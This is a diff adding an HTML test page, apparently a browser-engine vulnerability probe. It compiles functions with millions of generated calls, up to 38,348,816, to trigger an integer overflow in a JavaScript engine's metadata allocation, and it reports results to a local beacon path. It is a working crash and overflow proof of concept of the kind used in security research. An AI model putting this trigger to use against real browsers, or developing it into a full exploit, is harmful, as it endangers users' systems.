@@ -1,0 +1,122 @@
+<!--
+  p615d: MetadataTable scale boundary + direct 38M test
+
+  p615c results: 1M=OK, 10M=CRASH (OOM for 1.12GB metadata).
+  10M crashes before reaching the 38M overflow test.
+
+  This probe:
+  1. Tests 2M and 5M to find the OOM boundary
+  2. Skips straight to 38M (the overflow case) as the final test
+  3. For 38M: metadata allocation is only 100KB (overflowed), so OOM is not the issue
+  4. Tests execution with bail at 5 — if callbacks fire, the overflow is exploitable
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p615d</title>
+<script>
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m), false);
+    x.send();
+  } catch(e) {
+    try { new Image().src = '/beacon/' + encodeURIComponent('XFAIL-' + m); } catch(e2){}
+  }
+}
+
+(function() {
+b('P615D-START');
+
+// ===== TEST 1: 2,000,000 calls (metadata = 224MB, no overflow) =====
+b('P615D-2M-COMPILE');
+var fn2m;
+try {
+  fn2m = new Function('x', 'x();'.repeat(2000000));
+} catch(e) {
+  b('P615D-2M-CFAIL=' + String(e).slice(0, 100));
+}
+if (fn2m) {
+  b('P615D-2M-COMPILED');
+  var c2m = 0;
+  try {
+    fn2m(function() { c2m++; if (c2m >= 100) throw 'bail'; });
+  } catch(e) {}
+  b('P615D-2M-CALLS=' + c2m);
+  fn2m = null;
+} else {
+  b('P615D-2M-SKIP');
+}
+
+// ===== TEST 2: 5,000,000 calls (metadata = 560MB, no overflow) =====
+b('P615D-5M-COMPILE');
+var fn5m;
+try {
+  fn5m = new Function('x', 'x();'.repeat(5000000));
+} catch(e) {
+  b('P615D-5M-CFAIL=' + String(e).slice(0, 100));
+}
+if (fn5m) {
+  b('P615D-5M-COMPILED');
+  var c5m = 0;
+  try {
+    fn5m(function() { c5m++; if (c5m >= 100) throw 'bail'; });
+  } catch(e) {}
+  b('P615D-5M-CALLS=' + c5m);
+  fn5m = null;
+} else {
+  b('P615D-5M-SKIP');
+}
+
+// ===== TEST 3: 38,348,816 calls (THE OVERFLOW — metadata wraps to 100,096) =====
+// Build source string
+b('P615D-38M-SOURCE');
+var source;
+try {
+  source = 'x();'.repeat(38348816);
+} catch(e) {
+  try {
+    var chunks = [];
+    var CHUNK = 100000;
+    var full = Math.floor(38348816 / CHUNK);
+    var rem = 38348816 % CHUNK;
+    var one = 'x();'.repeat(CHUNK);
+    for (var i = 0; i < full; i++) chunks.push(one);
+    if (rem > 0) chunks.push('x();'.repeat(rem));
+    source = chunks.join('');
+    chunks = null; one = null;
+  } catch(e2) {
+    b('P615D-38M-SRCFAIL');
+    source = null;
+  }
+}
+if (source) {
+  b('P615D-38M-SRCLEN=' + source.length);
+
+  b('P615D-38M-COMPILE');
+  var fn38m;
+  try {
+    fn38m = new Function('x', source);
+    source = null;
+  } catch(e) {
+    b('P615D-38M-CFAIL=' + String(e).slice(0, 100));
+    source = null;
+  }
+
+  if (fn38m) {
+    b('P615D-38M-COMPILED');
+
+    // Execute with minimal bail — NO beacons inside callback
+    var c38m = 0;
+    b('P615D-38M-EXEC');
+    try {
+      fn38m(function() { c38m++; if (c38m >= 5) throw 'bail'; });
+    } catch(e) {
+      b('P615D-38M-CATCH=' + String(e).slice(0, 50));
+    }
+    b('P615D-38M-CALLS=' + c38m);
+  }
+}
+
+b('P615D-ALIVE');
+})();
+</script></head><body>p615d: MetadataTable scale + 38M direct test</body></html>
